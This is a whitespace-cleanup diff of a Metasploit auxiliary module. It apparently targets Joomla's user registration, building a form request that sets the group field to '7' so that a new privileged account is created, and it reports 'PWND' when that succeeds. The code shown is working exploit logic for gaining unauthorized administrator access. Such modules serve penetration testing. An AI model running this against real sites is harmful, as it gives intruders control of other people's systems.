@@ -76,9 +76,9 @@ class MetasploitModule < Msf::Auxiliary
     mime = Rex::MIME::Message.new
     mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[name]"')
     mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[username]"')
-    mime.add_part('7', nil, nil, 'form-data; name="user[groups][]"') 
-    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password1]"') 
-    mime.add_part(datastore['PASSWORD'] , nil, nil, 'form-data; name="user[password2]"') 
+    mime.add_part('7', nil, nil, 'form-data; name="user[groups][]"')
+    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password1]"')
+    mime.add_part(datastore['PASSWORD'] , nil, nil, 'form-data; name="user[password2]"')
     mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email1]"')
     mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email2]"')
     mime.add_part('com_users', nil, nil, 'form-data; name="option"')
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype'  => "multipart/form-data; boundary=#{mime.bound}",
       'data'   => mime.to_s
     )
-    
+
     if res && res.code == 200
       print_good("PWND - Your user has been created")
       print_status("\tUsername: " + datastore['USERNAME'])
@@ -107,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         print_error("There was an issue, but the user could have been created.")
-        
+
         parsed_data = Nokogiri::HTML.parse res.body
         parsed_data.xpath('//div[@class="alert-message"]').each do |alert_msg|
           print_error("\t" + alert_msg.text)
